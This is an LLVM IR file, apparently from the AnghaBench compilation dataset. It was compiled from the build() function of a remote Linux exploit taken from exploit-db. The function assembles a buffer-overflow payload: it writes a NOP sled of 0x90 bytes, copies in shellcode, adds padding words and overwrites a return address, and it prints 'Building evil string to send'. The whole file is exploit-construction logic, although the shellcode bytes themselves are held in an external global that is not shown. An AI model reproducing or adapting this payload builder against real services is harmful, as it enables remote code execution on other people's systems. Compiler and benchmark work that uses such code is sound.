; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_143.c_build.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_143.c_build.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [55 x i8] c"[%s] Building evil string to send (using ret 0x%x)...\0A\00", align 1
@ret_addr = common dso_local global i32 0, align 4
@SIZE = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [38 x i8] c"[-] Can't allocate memory,exiting...\0A\00", align 1
@BUFFERSIZE = common dso_local global i64 0, align 8
@shellcode = common dso_local global i32* null, align 8
@DUMMY1 = common dso_local global i32 0, align 4
@DUMMY2 = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @build(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i64*, align 8
  store i8* %0, i8** %2, align 8
  %7 = load i32, i32* @stdout, align 4
  %8 = load i8*, i8** %2, align 8
  %9 = load i32, i32* @ret_addr, align 4
  %10 = call i32 (i32, i8*, ...) @fprintf(i32 %7, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str, i64 0, i64 0), i8* %8, i32 %9)
  %11 = load i64, i64* @SIZE, align 8
  %12 = add nsw i64 %11, 1
  %13 = call i64 @malloc(i64 %12)
  %14 = inttoptr i64 %13 to i8*
  store i8* %14, i8** %3, align 8
  %15 = load i8*, i8** %3, align 8
  %16 = icmp ne i8* %15, null
  br i1 %16, label %21, label %17

17:                                               ; preds = %1
  %18 = load i32, i32* @stderr, align 4
  %19 = call i32 (i32, i8*, ...) @fprintf(i32 %18, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.1, i64 0, i64 0))
  %20 = call i32 @exit(i32 1) #3
  unreachable

21:                                               ; preds = %1
  %22 = load i8*, i8** %3, align 8
  store i8* %22, i8** %4, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = load i64, i64* @BUFFERSIZE, align 8
  %25 = load i32*, i32** @shellcode, align 8
  %26 = call i32 @strlen(i32* %25)
  %27 = sext i32 %26 to i64
  %28 = sub nsw i64 %24, %27
  %29 = call i32 @memset(i8* %23, i32 144, i64 %28)
  %30 = load i64, i64* @BUFFERSIZE, align 8
  %31 = load i32*, i32** @shellcode, align 8
  %32 = call i32 @strlen(i32* %31)
  %33 = sext i32 %32 to i64
  %34 = sub nsw i64 %30, %33
  %35 = load i8*, i8** %4, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 %34
  store i8* %36, i8** %4, align 8
  %37 = load i8*, i8** %2, align 8
  %38 = call i32 @check_shellcode(i8* %37)
  store i32 %38, i32* %5, align 4
  %39 = icmp slt i32 %38, 0
  br i1 %39, label %40, label %42

40:                                               ; preds = %21
  %41 = call i32 @exit(i32 1) #3
  unreachable

42:                                               ; preds = %21
  store i32 0, i32* %5, align 4
  br label %43

43:                                               ; preds = %57, %42
  %44 = load i32, i32* %5, align 4
  %45 = load i32*, i32** @shellcode, align 8
  %46 = call i32 @strlen(i32* %45)
  %47 = icmp slt i32 %44, %46
  br i1 %47, label %48, label %60

48:                                               ; preds = %43
  %49 = load i32*, i32** @shellcode, align 8
  %50 = load i32, i32* %5, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  %53 = load i32, i32* %52, align 4
  %54 = trunc i32 %53 to i8
  %55 = load i8*, i8** %4, align 8
  %56 = getelementptr inbounds i8, i8* %55, i32 1
  store i8* %56, i8** %4, align 8
  store i8 %54, i8* %55, align 1
  br label %57

57:                                               ; preds = %48
  %58 = load i32, i32* %5, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %5, align 4
  br label %43

60:                                               ; preds = %43
  %61 = load i8*, i8** %4, align 8
  %62 = bitcast i8* %61 to i64*
  store i64* %62, i64** %6, align 8
  store i32 0, i32* %5, align 4
  br label %63

63:                                               ; preds = %71, %60
  %64 = load i32, i32* %5, align 4
  %65 = icmp slt i32 %64, 24
  br i1 %65, label %66, label %74

66:                                               ; preds = %63
  %67 = load i32, i32* @DUMMY1, align 4
  %68 = sext i32 %67 to i64
  %69 = load i64*, i64** %6, align 8
  %70 = getelementptr inbounds i64, i64* %69, i32 1
  store i64* %70, i64** %6, align 8
  store i64 %68, i64* %69, align 8
  br label %71

71:                                               ; preds = %66
  %72 = load i32, i32* %5, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %5, align 4
  br label %63

74:                                               ; preds = %63
  store i32 0, i32* %5, align 4
  br label %75

75:                                               ; preds = %83, %74
  %76 = load i32, i32* %5, align 4
  %77 = icmp slt i32 %76, 8
  br i1 %77, label %78, label %86

78:                                               ; preds = %75
  %79 = load i8*, i8** @DUMMY2, align 8
  %80 = ptrtoint i8* %79 to i64
  %81 = load i64*, i64** %6, align 8
  %82 = getelementptr inbounds i64, i64* %81, i32 1
  store i64* %82, i64** %6, align 8
  store i64 %80, i64* %81, align 8
  br label %83

83:                                               ; preds = %78
  %84 = load i32, i32* %5, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %5, align 4
  br label %75

86:                                               ; preds = %75
  %87 = load i32, i32* @ret_addr, align 4
  %88 = sext i32 %87 to i64
  %89 = load i64*, i64** %6, align 8
  %90 = getelementptr inbounds i64, i64* %89, i32 1
  store i64* %90, i64** %6, align 8
  store i64 %88, i64* %89, align 8
  %91 = load i8*, i8** @DUMMY2, align 8
  %92 = ptrtoint i8* %91 to i64
  %93 = load i64*, i64** %6, align 8
  %94 = getelementptr inbounds i64, i64* %93, i32 1
  store i64* %94, i64** %6, align 8
  store i64 %92, i64* %93, align 8
  %95 = load i64*, i64** %6, align 8
  %96 = bitcast i64* %95 to i8*
  store i8* %96, i8** %4, align 8
  %97 = load i8*, i8** %4, align 8
  store i8 0, i8* %97, align 1
  %98 = load i8*, i8** %3, align 8
  ret i8* %98
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i64 @malloc(i64) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i64) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @check_shellcode(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
